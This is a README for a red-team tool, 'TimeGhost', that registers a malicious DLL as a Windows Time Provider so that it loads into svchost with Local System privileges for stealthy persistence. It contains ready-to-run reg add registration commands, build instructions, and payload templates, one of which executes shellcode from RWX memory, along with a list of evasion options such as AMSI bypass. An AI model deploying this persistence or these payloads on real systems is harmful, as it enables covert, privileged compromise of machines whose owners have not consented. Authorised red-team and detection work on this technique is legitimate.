# TimeProvider Persistence (T1543.003)

A Red Team tool implementing the Windows Time Provider persistence technique.

## Technique Overview

This technique exploits the Windows Time Service (W32Time) persistence mechanism by registering a malicious DLL as a Time Provider. W32Time loads all libraries registered under:

```
HKLM\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders
```

The DLL is loaded into svchost.exe running with Local System privileges, providing stealthy persistence.

## DLL Requirements

The W32Time service requires the DLL to export the following functions:

| Function | Purpose |
|----------|---------|
| `TimeProvOpen()` | Entry point called during provider initialization |
| `TimeProvClose()` | Cleanup function |
| `TimeProvGetSamples()` | Time sample retrieval |
| `TimeProvSetConfig()` | Configuration handling |

## Implementation

The `TimeGhost.cpp` provides a minimal headerless DLL with:

- Manual typedefs for core Windows types (avoids full windows.h dependency)
- Exports required Time Provider interface functions
- `TimeProvOpen()` serves as the main entry point for payload execution
- Currently returns `ERROR_SUCCESS` as placeholder

## Usage

### Compile
```cmd
cl /LD /O2 /EHsc TimeGhost.cpp
```

### Deploy Persistence

```cmd
reg add "HKLM\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\MaliciousTimeProvider" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\MaliciousTimeProvider\DllName" /ve /d "C:\Path\To\DLLname" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\MaliciousTimeProvider\Enabled" /ve /d "1" /t REG_DWORD /f
```

### Payload Integration

Replace the placeholder in `TimeProvOpen()` with your malicious payload code. The payload runs in svchost.exe with Local System privileges.

**What is a payload?**
A payload is the malicious code that executes when the DLL is loaded. In Red Team operations, this typically includes:
- Shellcode execution (reflective loader, staged implants)
- DLL injection into other processes
- Fileless execution (CLR, WMI, WScript)
- Lateral movement (named pipes, SMB)
- Defense evasion (AMSI bypass, ETW blocking)

**Example payloads:**

**MessageBox (testing):**
```cpp
DWORD WINAPI TimeProvOpen(...) {
    MessageBoxW(NULL, L"Payload executed", L"TimeProvider", MB_OK);
    return ERROR_SUCCESS;
}
```

**Shellcode execution:**
```cpp
DWORD WINAPI TimeProvOpen(...) {
    unsigned char shellcode[] = { /* your shellcode */ };
    void* exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, shellcode, sizeof(shellcode));
    ((void(*)())exec)();
    return ERROR_SUCCESS;
}
```

**C2 beacon:**
```cpp
DWORD WINAPI TimeProvOpen(...) {
    // Load and execute C2 implant (use your own C2 framework)
    return ERROR_SUCCESS;
}
```

## Compilation

### Prerequisites
- Visual Studio 2022+ or Build Tools
- Windows SDK 10.0.22621+

### Compile (Visual Studio Developer Command Prompt)
```cmd
cl /LD /O2 /EHsc TimeGhost.cpp
```

### Compile (x64 with explicit paths)
```cmd
"C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\[VERSION]\bin\Hostx64\x64\cl.exe" ^
/LD /O2 /EHsc ^
/I"C:\Program Files (x86)\Windows Kits\10\Include\[VERSION]\um" ^
/I"C:\Program Files (x86)\Windows Kits\10\Include\[VERSION]\ucrt" ^
/I"C:\Program Files (x86)\Windows Kits\10\Include\[VERSION]\shared" ^
TimeGhost.cpp ^
/link /out:timeghost.dll ^
/libpath:"C:\Program Files (x86)\Windows Kits\10\Lib\[VERSION]\um\x64" ^
/libpath:"C:\Program Files (x86)\Windows Kits\10\Lib\[VERSION]\ucrt\x64"
```

Replace `[VERSION]` with your installed SDK/MSVC version.

### Verify exports
```cmd
dumpbin /exports timeghost.dll
```

Expected output:
```
TimeProvClose
TimeProvGetSamples
TimeProvOpen
TimeProvSetConfig
```

## References

- MITRE ATT&CK: T1543.003 (Windows Service)
- Windows Time Service: https://docs.microsoft.com/en-us/windows-server/networking/windows-time-service/windows-timeservice-tools-and-settings